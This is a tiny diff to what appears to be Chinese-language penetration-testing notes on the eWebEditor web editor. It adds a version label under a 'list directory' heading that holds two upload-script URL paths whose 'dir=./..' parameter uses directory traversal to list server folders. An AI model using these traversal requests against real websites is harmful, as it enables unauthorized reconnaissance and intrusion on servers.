@@ -32,6 +32,8 @@ ewebeditor-v12
 # 列目录
 
 ```
+ewebeditor-v2
+
 /admin/ewebeditor/admin/upload.asp?id=16&d_viewmode=&dir=./..
 
 /admin/editor/uploadfile.asp?id=16&d_viewmode=&dir=./..
